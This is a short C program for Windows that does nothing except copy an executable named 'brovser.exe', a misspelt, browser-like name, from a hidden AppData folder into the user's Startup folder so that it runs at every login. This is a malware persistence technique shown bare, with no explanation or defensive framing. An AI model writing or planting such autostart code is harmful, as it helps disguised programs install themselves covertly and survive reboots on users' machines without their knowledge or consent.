#include <windows.h>
#include <winreg.h>

int main(){
    system("copy c:\\Users\\%USERNAME%\\AppData\\Local\\HELLO\\brovser.exe \"C:\\Users\\%USERNAME%\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\"");
    return 0;
}